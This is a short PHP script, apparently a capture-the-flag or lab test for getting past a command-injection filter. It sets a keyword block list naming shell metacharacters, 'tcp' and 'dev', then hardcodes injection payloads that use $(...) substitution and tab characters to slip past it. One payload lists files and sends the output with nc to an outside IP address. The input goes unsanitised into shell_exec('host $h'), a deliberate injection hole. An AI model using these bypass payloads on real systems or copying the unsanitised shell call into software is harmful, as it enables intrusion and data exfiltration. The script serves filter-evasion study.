<?php

//highlight_file(__FILE__);

$waf = array('sh', ';', '|', '`', '&', ' ', '\x', 'tcp', 'dev');

//$h = $_GET['h'];
$h = "www.gooogle.com$(ls\t/>/$(echo\td)ev/pt)";
$h = "www.google.com$($(ls>a)nc\t172.17.242.158\t12002<a)";
for($i = 0; $i < count($waf); $i++)
    if(strpos($h, $waf[$i]) !== FALSE)

        print("GG :".$waf[$i]."\n");

$res = shell_exec("host $h");
print('command: '."host $h");
// print("res=[[[".$res.']]]');




/*
one line for:
for((i=1;i<=10;i+=2)); do echo "Welcome $i times"; done
for((j=0;j<=10;j++)); do echo "a" >/dev/pts/$j; done

*/

?>

